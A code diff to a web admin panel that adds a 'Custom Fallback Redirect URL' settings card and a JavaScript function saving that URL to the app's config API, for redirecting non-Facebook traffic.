@@ -553,6 +553,19 @@
         <button onclick="saveSettings()" class="btn-primary">💾 Save Tracking Code</button>
       </div>
 
+      <!-- Custom Fallback Redirect URL Card (TOP) -->
+      <div class="card">
+        <div class="card-title">🌐 Custom Fallback Redirect URL</div>
+        <p style="color:var(--text-muted);font-size:0.85rem;margin-bottom:14px;">
+          All non-Facebook traffic (Google Search, WhatsApp, Direct link) and default image clicks will be redirected to this custom URL instead of Google.
+        </p>
+        <div class="form-group">
+          <label>Custom Fallback URL</label>
+          <input type="text" id="targetUrlInput" placeholder="https://www.google.com" />
+        </div>
+        <button onclick="saveFallbackUrl()" class="btn-primary">💾 Save Custom Fallback URL</button>
+      </div>
+
       <!-- Google Authenticator 2FA Card -->
       <div class="card">
         <div class="card-title">📱 Google Authenticator 2FA Manager</div>
@@ -985,6 +998,26 @@
         showAlert('Tracking code saved successfully!');
       } else {
         showAlert(data.error || 'Failed to save tracking code', 'error');
+      }
+    }
+
+    async function saveFallbackUrl() {
+      const targetUrl = document.getElementById('targetUrlInput').value.trim();
+      if (!targetUrl) {
+        showAlert('Please enter a valid fallback URL', 'error');
+        return;
+      }
+
+      const res = await fetch('/api/admin/config', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ targetUrl })
+      });
+      const data = await res.json();
+      if (data.success) {
+        showAlert('Custom Fallback Redirect URL saved successfully!');
+      } else {
+        showAlert(data.error || 'Failed to save Fallback URL', 'error');
       }
     }
 
